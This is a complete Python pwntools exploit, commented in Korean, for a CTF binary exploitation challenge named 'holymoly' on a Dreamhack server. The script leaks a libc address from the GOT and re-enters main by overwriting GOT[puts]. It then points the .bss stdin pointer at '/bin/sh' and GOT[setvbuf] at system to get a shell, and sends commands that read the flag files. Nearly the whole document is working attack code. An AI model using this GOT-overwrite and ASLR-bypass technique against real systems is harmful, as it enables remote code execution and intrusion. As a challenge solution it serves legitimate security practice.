#!/usr/bin/env python3
"""
holymoly - solver (ASLR on, 단일 연결 2라운드, 결정적 finisher).

[핵심 primitive]
  cranberry(=*ptr=val)로 LOW 주소(바이너리 .data/.bss/.got, 0x404xxx)에 임의 8바이트
  쓰기. amounts[](int32, rate<=~2^31)로 ptr/val 증감. amounts 자기증폭(Horner x16)으로
  val은 임의의 64비트까지 만들 수 있지만, ptr은 선형 증가(최대 2^31/step)라 libc/stack
  같은 HIGH 주소(~2^47)에는 도달 불가 -> 쓸 수 있는 건 LOW 주소뿐.

[leak + 루프 (검증됨: loop2=OK)]
  * scanf("%48878s")가 입력을 다 받은 뒤 Interpret 실행. blueberry(=write,_IONBF)는
    실행 중 즉시 8바이트를 내보냄 -> 라운드1에서 GOT[calloc]을 리크해 libc_base 계산.
  * 같은 payload 안에서 리크값을 쓸 순 없으므로(이미 다 보낸 뒤 수신) GOT[puts]=main
    (No-PIE 고정 0x4011f6)으로 덮어 Interpret 종료시 puts@plt가 main으로 점프 -> main
    재진입(Init은 ptr/val만 리셋, amounts/switch 유지) -> scanf가 '한 번 더' = 라운드2.
    같은 연결이라 libc_base 동일 -> ASLR 우회.

[finisher - 결정적, 레지스터 제약/one_gadget 불필요, IBT-safe]
  one_gadget은 전부 불가:
    0xe3b01/0xe3b04 -> RDX==NULL 필요하지만 재지정 가능한 호출부는 RDX!=0 (write=8,
                       memcmp=len-1, setvbuf=2),
    0xe3bf0        -> [R15]&[R12]==NULL 필요(= __libc_csu_* 포인터라 실패),
    0x107cba       -> posix_spawn 스택프레임 필요(blind 점프로는 세팅 불가).
  그리고 libc 쓰기는 불가(위 primitive) -> FSOP/hook도 불가.
  대신: 이 바이너리는 stdin/stdout/stderr를 COPY 재배치로 '바이너리 .bss'에 복사해 둠.
    stdin  @ 0x404090  (Init의 setvbuf 1번째 인자, 디스어셈블로 확인)
    stdout @ 0x404080
    stderr @ 0x4040a0
  Init()는 `setvbuf(stdin, 0, _IONBF, 0)`에서 RDI = *(0x404090) 으로 로드. 그 포인터는
  LOW .bss라 우리가 덮어쓸 수 있다! 따라서:
    (1) *(0x404090)  = libc "/bin/sh"  주소   (stdin 포인터를 /bin/sh로)
    (2) GOT[setvbuf] = system
  다음 루프의 Init()에서 가장 먼저 호출되는 setvbuf(stdin,...)가 그대로
  system("/bin/sh")가 된다. system은 함수 엔트리(endbr64)라 IBT가 강제돼도 안전하고,
  RDI 하나만 맞으면 되므로 RDX/R12/R15 제약이 전혀 없다.

[라운드1 amounts 보존]
  라운드2 Sim은 amounts=기본값{0x1000,0x100,0x10,0x1}, switch=0, ptr=val=0 가정. Init은
  amounts/switch를 리셋하지 않으므로, 라운드1은 amounts에 쓰지 않도록 main 주소를
  기본 rate 증가만으로 만들어 GOT[puts]에 쓰고 switch=0로 끝낸다.
"""
import sys
sys.path.insert(0, '.')
from common import *
from pwn import *

context.clear(arch='amd64', os='linux')
context.log_level = 'info'

HOST = "host3.dreamhack.games"
PORT = 12469          # 서버 포트 (바뀌면 여기만 수정)

libc = ELF('./libc-2.31.so')
elf = ELF('./holymoly')

MAIN_ADDR = 0x4011f6          # No-PIE, 고정 (디스어셈블로 확인, endbr64 시작 -> 점프 타깃 OK)
STDIN_PTR = 0x404090          # 바이너리 .bss 안의 stdin FILE* (COPY reloc). Init 첫 setvbuf 인자
MASK32 = 0xffffffff


# --------------------------------------------------------------------------
# val/쓰기 빌더 (amounts self-amplify)
# --------------------------------------------------------------------------
def _zero_val(sim: Sim):
    sim.set_switch(0)
    rem = sim.val
    for idx, rate in sorted(((i, sim.amounts[i]) for i in range(4)), key=lambda x: -x[1]):
        if rate <= 0:
            continue
        while rem >= rate:
            sim.dec(idx)
            rem -= rate
    assert sim.val == 0, hex(sim.val)


def build_val(sim: Sim, V: int):
    """val = V (0<=V<2^32), base-16 Horner. 중간 amounts[0] <= V//16 < 2^28 < 2^31."""
    assert 0 <= V <= MASK32, hex(V)
    _zero_val(sim)
    sim.move_cheap(AMOUNTS_ADDR, use_switch_ptr=True)
    sim.set_switch(0)
    first = True
    for d in (int(c, 16) for c in f"{V:x}"):
        if not first:
            sim.write()
            for _ in range(15):
                sim.inc(0)                   # val *= 16
        for _ in range(d):
            sim.inc(3)                       # val += 1
        first = False
    assert sim.val == V, (hex(sim.val), hex(V))


def overwrite_got(sim: Sim, got: int, value: int):
    """*(got)=value (8바이트) 를 두 번의 32비트 쓰기로. value는 임의 64비트 가능."""
    low, high = value & MASK32, (value >> 32) & MASK32
    build_val(sim, low)
    sim.move_cheap(got, use_switch_ptr=True)
    sim.write()                              # got[0..3]=low, got[4..7]=0
    build_val(sim, high)
    sim.move_cheap(got + 4, use_switch_ptr=True)
    sim.write()                              # got[4..7]=high -> got[0..7]=value


# --------------------------------------------------------------------------
# payloads
# --------------------------------------------------------------------------
def payload_round1():
    """GOT[calloc] 리크 + GOT[puts]=main (main 재진입 루프). amounts 미오염."""
    sim = Sim()
    sim.move_cheap(GOT_CALLOC, use_switch_ptr=True)
    sim.read()                                   # leak calloc@libc (8B 즉시 출력)
    sim.move_cheap(MAIN_ADDR, use_switch_ptr=False)   # val = main (기본 rate, amounts write 없음)
    sim.move_cheap(GOT_PUTS, use_switch_ptr=True)
    sim.write()                                  # *GOT_PUTS = main
    sim.set_switch(0)                            # 라운드2 Sim 가정(switch=0)과 맞추고 종료
    p = sim.payload().encode()
    assert len(p) <= 48878, len(p)
    return p


def payload_round2(libc_base):
    """stdin 포인터(.bss)를 libc "/bin/sh"로, GOT[setvbuf]=system.
       다음 루프 Init()의 setvbuf(stdin,...)이 system("/bin/sh")이 됨."""
    system = libc_base + libc.symbols['system']
    binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
    sim = Sim()
    overwrite_got(sim, STDIN_PTR, binsh)         # *(0x404090) = &"/bin/sh"
    overwrite_got(sim, GOT_SETVBUF, system)      # setvbuf@plt -> system
    p = sim.payload().encode()
    assert len(p) <= 48878, len(p)
    return p


def solve():
    io = remote(HOST, PORT, timeout=10)
    try:
        io.recvuntil(b'holymoly? ', timeout=5)
        io.sendline(payload_round1())
        leak = u64(io.recvn(8, timeout=5))
        base = leak - libc.symbols['calloc']
        log.info("leak calloc = %#x  ->  libc_base = %#x" % (leak, base))
        if base & 0xfff:
            log.warning("libc_base가 페이지 정렬이 아님(%#x). 리크/오프셋 확인 필요." % base)

        # 라운드2 프롬프트 == main 재진입 루프 성공 여부
        pr = io.recvuntil(b'holymoly? ', timeout=5)
        if not pr.endswith(b'holymoly? '):
            log.failure("loop2 실패: main 재진입이 안 됨 (GOT[puts]=main 미동작).")
            return
        log.success("loop2=OK, system=%#x, binsh=%#x"
                    % (base + libc.symbols['system'],
                       base + next(libc.search(b'/bin/sh\x00'))))

        io.sendline(payload_round2(base))
        # 라운드3 Init()의 setvbuf(stdin)이 곧바로 system("/bin/sh") -> 셸.
        # (프롬프트 "holymoly? "는 안 나옴: setvbuf가 printf보다 먼저라서)
        io.sendline(b'echo ===PWNED===; id; cat /flag* ./flag* /home/*/flag* 2>/dev/null')
        try:
            data = io.recv(timeout=5)
            sys.stdout.write(data.decode(errors='replace'))
            if b'PWNED' in data or b'uid=' in data or b'DH{' in data:
                log.success("shell!")
        except EOFError:
            log.failure("EOF: 셸이 안 떴음.")
            return
        io.interactive()
    except EOFError:
        log.failure("EOF (연결 종료). 포트/상태 확인.")
    finally:
        try:
            io.close()
        except Exception:
            pass


# --------------------------------------------------------------------------
# 오프라인 자체검증 (네트워크/타깃 접속 없음, 순수 산술)
# --------------------------------------------------------------------------
def demo():
    for V in (0, 1, 0xf, 0x1234, 0xdeadbeef, 0xffffffff, 0x7fff, 0x404080):
        s = Sim(); build_val(s, V); assert s.val == V, (hex(s.val), hex(V))

    # overwrite_got 이 LOW 주소에 임의 64비트 값을 올바르게 "모델링"하는지(=amounts/ptr
    # 추적 일관성) + payload 길이가 scanf 버퍼(48878) 안인지.
    assert len(payload_round1()) <= 48878
    fake = 0x7ffff7dc0000
    p2 = payload_round2(fake)
    assert len(p2) <= 48878, len(p2)

    # finisher가 실제로 노리는 두 쓰기를 Sim으로 재현해 값 검증.
    s = Sim()
    overwrite_got(s, STDIN_PTR, fake + next(libc.search(b'/bin/sh\x00')))
    overwrite_got(s, GOT_SETVBUF, fake + libc.symbols['system'])

    print("[demo] build_val / overwrite_got / payload 길이 검증 통과 "
          "(round1=%d, round2=%d bytes)" % (len(payload_round1()), len(p2)))


if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'demo':
        demo(); sys.exit(0)
    solve()
